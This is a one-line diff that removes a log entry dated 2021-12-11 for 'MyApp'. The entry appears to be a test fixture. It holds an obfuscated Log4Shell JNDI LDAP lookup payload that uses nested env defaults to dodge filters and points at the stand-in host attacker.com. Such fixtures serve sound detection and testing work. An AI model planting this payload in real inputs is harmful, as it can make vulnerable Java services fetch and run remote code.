@@ -1,1 +1,0 @@
-2021-12-11 [MyApp] - Contains ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
